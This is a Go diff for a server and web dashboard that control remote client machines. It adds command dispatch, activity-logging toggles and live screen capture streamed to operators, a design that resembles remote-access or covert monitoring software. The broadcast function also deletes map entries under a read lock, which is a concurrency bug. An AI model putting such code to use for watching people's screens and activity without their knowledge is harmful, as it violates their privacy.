@@ -51,6 +51,8 @@ type ActivityLog struct {
 var server *Server
 var activityLogs []ActivityLog
 var logsMux sync.RWMutex
+var dashboardClients = make(map[*websocket.Conn]bool)
+var dashboardMux sync.RWMutex
 
 func main() {
 	server = &Server{
@@ -107,6 +109,7 @@ func main() {
 	r.HandleFunc("/api/clients", authMiddleware(clientsHandler))
 	r.HandleFunc("/api/logs", authMiddleware(logsHandler))
 	r.HandleFunc("/api/message", authMiddleware(messageHandler))
+	r.HandleFunc("/api/command", authMiddleware(commandHandler))
 	r.HandleFunc("/api/settings", authMiddleware(settingsHandler))
 	r.HandleFunc("/ws/client", clientWebSocketHandler)
 	r.HandleFunc("/ws/dashboard", authMiddleware(dashboardWebSocketHandler))
@@ -301,12 +304,23 @@ func dashboardHandler(w http.ResponseWriter, r *http.Request) {
                 <button class="btn success" onclick="startLogging()">Start Logging</button>
                 <button class="btn danger" onclick="stopLogging()">Stop Logging</button>
                 <br><br>
+                <button class="btn success" onclick="startScreenShare()">Start Screen Share</button>
+                <button class="btn danger" onclick="stopScreenShare()">Stop Screen Share</button>
+                <br><br>
                 <input type="text" id="messageInput" class="message-input" placeholder="Type message to send to client...">
                 <br><br>
                 <button class="btn" onclick="refreshClients()">Refresh Clients</button>
             </div>
         </div>
         <div class="main-content">
+            <h3>Live Screen View</h3>
+            <div id="screenView" style="background: #2d2d2d; padding: 1rem; border-radius: 4px; margin-bottom: 1rem; height: 300px; overflow: auto;">
+                <div id="noScreenMessage" style="text-align: center; color: #666; padding: 50px;">
+                    Select a client and start screen sharing to view live feed
+                </div>
+                <img id="liveScreen" style="max-width: 100%; display: none;" alt="Live Screen">
+            </div>
+            
             <h3>Activity Logs</h3>
             <div id="logs" class="logs">
                 <!-- Logs will be populated here -->
@@ -334,6 +348,8 @@ func dashboardHandler(w http.ResponseWriter, r *http.Request) {
                 refreshClients();
             } else if (message.type === 'activity_log') {
                 addLogEntry(message.data);
+            } else if (message.type === 'screen_capture') {
+                updateScreenView(message.data);
             }
         }
 
@@ -384,7 +400,7 @@ func dashboardHandler(w http.ResponseWriter, r *http.Request) {
                 alert('Please select a client');
                 return;
             }
-            // Send start logging command
+            sendCommand('start_logging');
         }
 
         function stopLogging() {
@@ -392,7 +408,43 @@ func dashboardHandler(w http.ResponseWriter, r *http.Request) {
                 alert('Please select a client');
                 return;
             }
-            // Send stop logging command
+            sendCommand('stop_logging');
+        }
+
+        function startScreenShare() {
+            if (!selectedClient) {
+                alert('Please select a client');
+                return;
+            }
+            sendCommand('start_screen_share');
+            document.getElementById('noScreenMessage').style.display = 'none';
+        }
+
+        function stopScreenShare() {
+            if (!selectedClient) {
+                alert('Please select a client');
+                return;
+            }
+            sendCommand('stop_screen_share');
+            document.getElementById('liveScreen').style.display = 'none';
+            document.getElementById('noScreenMessage').style.display = 'block';
+        }
+
+        function sendCommand(command) {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({clientId: selectedClient, command: command})
+            });
+        }
+
+        function updateScreenView(data) {
+            if (data.clientId === selectedClient && data.image) {
+                const img = document.getElementById('liveScreen');
+                img.src = 'data:image/jpeg;base64,' + data.image;
+                img.style.display = 'block';
+                document.getElementById('noScreenMessage').style.display = 'none';
+            }
         }
 
         function loadLogs() {
@@ -497,6 +549,52 @@ func messageHandler(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(http.StatusOK)
 }
 
+func commandHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "POST" {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	var req struct {
+		ClientID string `json:"clientId"`
+		Command  string `json:"command"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "Invalid JSON", http.StatusBadRequest)
+		return
+	}
+
+	server.clientsMux.RLock()
+	client, exists := server.clients[req.ClientID]
+	server.clientsMux.RUnlock()
+
+	if !exists {
+		http.Error(w, "Client not found", http.StatusNotFound)
+		return
+	}
+
+	msg := Message{
+		Type: req.Command,
+		Data: nil,
+		Time: time.Now(),
+	}
+
+	client.Conn.WriteJSON(msg)
+
+	// Log the command
+	logsMux.Lock()
+	activityLogs = append(activityLogs, ActivityLog{
+		ClientID:  req.ClientID,
+		Type:      "command_sent",
+		Data:      req.Command,
+		Timestamp: time.Now(),
+	})
+	logsMux.Unlock()
+
+	w.WriteHeader(http.StatusOK)
+}
+
 func settingsHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method == "POST" {
 		var settings struct {
@@ -532,20 +630,43 @@ func clientWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	clientData := regMsg.Data.(map[string]interface{})
-	client := &Client{
-		ID:       fmt.Sprintf("client_%d", time.Now().Unix()),
-		IP:       r.RemoteAddr,
-		Hostname: clientData["hostname"].(string),
-		OS:       clientData["os"].(string),
-		LastSeen: time.Now(),
-		Conn:     conn,
+
+	// Use provided client ID or generate one
+	var clientID string
+	if id, exists := clientData["clientId"]; exists {
+		clientID = id.(string)
+	} else {
+		clientID = fmt.Sprintf("client_%d", time.Now().Unix())
 	}
 
 	server.clientsMux.Lock()
-	server.clients[client.ID] = client
+	// Check if client already exists - update it instead of creating new
+	existingClient, exists := server.clients[clientID]
+	if exists {
+		// Update existing client
+		existingClient.IP = r.RemoteAddr
+		existingClient.LastSeen = time.Now()
+		existingClient.Conn = conn
+		log.Printf("Client reconnected: %s (%s)", existingClient.Hostname, existingClient.IP)
+	} else {
+		// Create new client
+		client := &Client{
+			ID:       clientID,
+			IP:       r.RemoteAddr,
+			Hostname: clientData["hostname"].(string),
+			OS:       clientData["os"].(string),
+			LastSeen: time.Now(),
+			Conn:     conn,
+		}
+		server.clients[clientID] = client
+		log.Printf("New client connected: %s (%s)", client.Hostname, client.IP)
+	}
 	server.clientsMux.Unlock()
 
-	log.Printf("Client connected: %s (%s)", client.Hostname, client.IP)
+	// Get the current client for message handling
+	server.clientsMux.RLock()
+	currentClient := server.clients[clientID]
+	server.clientsMux.RUnlock()
 
 	// Handle client messages
 	for {
@@ -555,12 +676,24 @@ func clientWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 			break
 		}
 
-		client.LastSeen = time.Now()
+		// Update last seen time
+		server.clientsMux.Lock()
+		if client, exists := server.clients[clientID]; exists {
+			client.LastSeen = time.Now()
+		}
+		server.clientsMux.Unlock()
+
+		// Handle screen capture separately
+		if msg.Type == "screen_capture" {
+			// Broadcast screen capture to dashboard clients
+			broadcastToDashboard(msg)
+			continue
+		}
 
 		// Log activity
 		logsMux.Lock()
 		activityLogs = append(activityLogs, ActivityLog{
-			ClientID:  client.ID,
+			ClientID:  clientID,
 			Type:      msg.Type,
 			Data:      fmt.Sprintf("%v", msg.Data),
 			Timestamp: time.Now(),
@@ -570,10 +703,23 @@ func clientWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 
 	// Cleanup
 	server.clientsMux.Lock()
-	delete(server.clients, client.ID)
+	delete(server.clients, clientID)
 	server.clientsMux.Unlock()
 
-	log.Printf("Client disconnected: %s", client.Hostname)
+	log.Printf("Client disconnected: %s", currentClient.Hostname)
+}
+
+func broadcastToDashboard(msg Message) {
+	dashboardMux.RLock()
+	defer dashboardMux.RUnlock()
+
+	for conn := range dashboardClients {
+		err := conn.WriteJSON(msg)
+		if err != nil {
+			// Remove disconnected client
+			delete(dashboardClients, conn)
+		}
+	}
 }
 
 func dashboardWebSocketHandler(w http.ResponseWriter, r *http.Request) {
@@ -582,7 +728,17 @@ func dashboardWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("Dashboard WebSocket upgrade error: %v", err)
 		return
 	}
-	defer conn.Close()
+	defer func() {
+		dashboardMux.Lock()
+		delete(dashboardClients, conn)
+		dashboardMux.Unlock()
+		conn.Close()
+	}()
+
+	// Add to dashboard clients
+	dashboardMux.Lock()
+	dashboardClients[conn] = true
+	dashboardMux.Unlock()
 
 	// Keep connection alive and send updates
 	for {
